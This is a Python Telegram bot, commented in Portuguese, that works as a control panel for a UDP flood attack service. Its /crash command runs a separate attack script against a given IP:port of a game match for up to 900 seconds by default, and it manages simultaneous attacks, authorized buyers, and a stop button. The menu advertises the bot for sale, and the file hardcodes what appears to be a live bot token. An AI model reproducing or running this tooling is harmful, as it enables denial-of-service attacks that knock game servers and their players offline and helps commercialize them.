import telebot
import subprocess
import json
import re
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# Configurações do bot
BOT_TOKEN = "7972626459:AAGjV9QjaDRfEYXOO-X4TgXoWo2MqQbwMz8"
SEU_ID_TELEGRAM = 6430703027
bot = telebot.TeleBot(BOT_TOKEN)
processos = {}
MAX_ATTACKS = 3  # Limite de ataques simultâneos
ARQUIVO_JSON = "usuarios_autorizados.json"

# Função para carregar usuários autorizados de um arquivo JSON
def carregar_usuarios():
    try:
        with open(ARQUIVO_JSON, "r") as f:
            return json.load(f)
    except FileNotFoundError:
        return [SEU_ID_TELEGRAM]  # Adiciona o ID do dono como padrão
    except json.JSONDecodeError:
        return [SEU_ID_TELEGRAM]

# Função para salvar usuários autorizados em um arquivo JSON
def salvar_usuarios():
    with open(ARQUIVO_JSON, "w") as f:
        json.dump(authorized_users, f)

# Lista de usuários autorizados
authorized_users = carregar_usuarios()

# Função para validar o formato de IP:PORTA
def validar_ip_porta(ip_porta):
    padrao = r'^\d{1,3}(\.\d{1,3}){3}:\d+$'
    return re.match(padrao, ip_porta) is not None

# Função para gerenciar o limite de ataques simultâneos
def manage_attacks():
    if len(processos) >= MAX_ATTACKS:
        oldest_process = list(processos.values())[0]
        oldest_process.terminate()
        del processos[list(processos.keys())[0]]

# Comando /menu
@bot.message_handler(commands=['menu'])
def menu(message):
    comandos = """
Comandos disponíveis:

🔹 /menu - Mostra este menu.

🔹 /crash <IP da partida> [tempo] - Inicia um ataque na partida por determinado tempo com potência padrão 10 (se tempo não for especificado, será 900 segundos).

🔹 /meuid - Mostra seu id de usuário do telegram.

🔹 /adduser <ID> - Adiciona um usuário autorizado (apenas para o dono).

🔹 /removeuser <ID> - Remove um usuário autorizado (apenas para o dono).

🔹 /listusers - Lista os usuários autorizados (apenas para o dono).

Deseja comprar o bot?
Fale com o @werbert_ofc
"""
    bot.send_message(message.chat.id, comandos)

# Comando /crash
@bot.message_handler(commands=['crash'])
def crash_server(message):
    if message.from_user.id not in authorized_users:
        bot.send_message(message.chat.id, "Acesso negado.")
        return

    comando = message.text.split()
    if len(comando) < 2:
        bot.send_message(message.chat.id, "Uso correto: /crash <IP:PORTA> [tempo]")
        return

    ip_porta = comando[1]
    if not validar_ip_porta(ip_porta):
        bot.send_message(message.chat.id, "Formato de IP:PORTA inválido.")
        return

    tempo = 900  # Tempo padrão
    potencia = 10  # Potência padrão

    if len(comando) > 2:
        try:
            tempo = int(comando[2])
        except ValueError:
            bot.send_message(message.chat.id, "Por favor, insira um tempo válido.")
            return

    if ip_porta in processos:
        bot.send_message(message.chat.id, f"Já existe um ataque em andamento para {ip_porta}.")
        return

    manage_attacks()

    comando_ataque = ["python3", "start.py", "UDP", ip_porta, str(potencia), str(tempo)]
    processo = subprocess.Popen(comando_ataque)
    processos[ip_porta] = processo

    # Criação do botão para parar o ataque
    markup = InlineKeyboardMarkup()
    parar_button = InlineKeyboardButton(
        text="🛑 Parar Ataque",
        callback_data=f"parar_{ip_porta}"
    )
    markup.add(parar_button)

    try:
        bot.send_message(
            message.chat.id,
            f"Ataque iniciado para {ip_porta} com potência {potencia} por {tempo} segundos.",
            reply_markup=markup
        )
    except Exception as e:
        bot.send_message(message.chat.id, "Erro ao iniciar ataque.")
        print(f"Erro ao enviar mensagem: {e}")

# Manipulador de callback para parar ataques
@bot.callback_query_handler(func=lambda call: call.data.startswith("parar_"))
def parar_ataque(call):
    ip_porta = call.data.split("_", 1)[1]
    if ip_porta in processos:
        processos[ip_porta].terminate()
        del processos[ip_porta]
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.id,
            text=f"Ataque para {ip_porta} foi parado com sucesso."
        )
    else:
        bot.answer_callback_query(call.id, "Nenhum ataque ativo para este IP.")

# Comando /adduser e /removeuser
@bot.message_handler(commands=['adduser', 'removeuser'])
def admin_commands(message):
    if message.from_user.id != SEU_ID_TELEGRAM:
        bot.send_message(message.chat.id, "Acesso negado.")
        return

    comando = message.text.split()
    if len(comando) != 2:
        bot.send_message(message.chat.id, "Uso correto: /adduser <ID>, /removeuser <ID>")
        return

    try:
        usuario_id = int(comando[1])
    except ValueError:
        bot.send_message(message.chat.id, "ID inválido. Por favor, insira um número válido.")
        return

    if comando[0] == "/adduser":
        if usuario_id not in authorized_users:
            authorized_users.append(usuario_id)
            salvar_usuarios()
            bot.send_message(message.chat.id, f"Usuário {usuario_id} adicionado com sucesso.")
        else:
            bot.send_message(message.chat.id, "Usuário já autorizado.")
    
    elif comando[0] == "/removeuser":
        if usuario_id in authorized_users:
            authorized_users.remove(usuario_id)
            salvar_usuarios()
            bot.send_message(message.chat.id, f"Usuário {usuario_id} removido com sucesso.")
        else:
            bot.send_message(message.chat.id, "Usuário não encontrado na lista de autorizados.")

# Comando /meuid
@bot.message_handler(commands=['meuid'])
def enviar_meu_id(message):
    # Criação de uma mensagem formatada com o ID
    meu_id = f"`{message.from_user.id}`"  # Formata o ID em Markdown
    bot.send_message(
        message.chat.id,
        f"Seu ID do Telegram é:\n{meu_id}\n\nClique no ID para copiá-lo!",
        parse_mode="Markdown"
    )

# Comando /listusers
@bot.message_handler(commands=['listusers'])
def list_users(message):
    if message.from_user.id != SEU_ID_TELEGRAM:
        bot.send_message(message.chat.id, "Acesso negado.")
        return

    if not authorized_users:
        bot.send_message(message.chat.id, "Não há usuários autorizados.")
    else:
        user_list = "\n".join([str(user) for user in authorized_users])
        bot.send_message(message.chat.id, f"Usuários autorizados:\n{user_list}")

# Função principal
def main():
    bot.polling(none_stop=True, timeout=60, long_polling_timeout=30)

if __name__ == "__main__":
    main()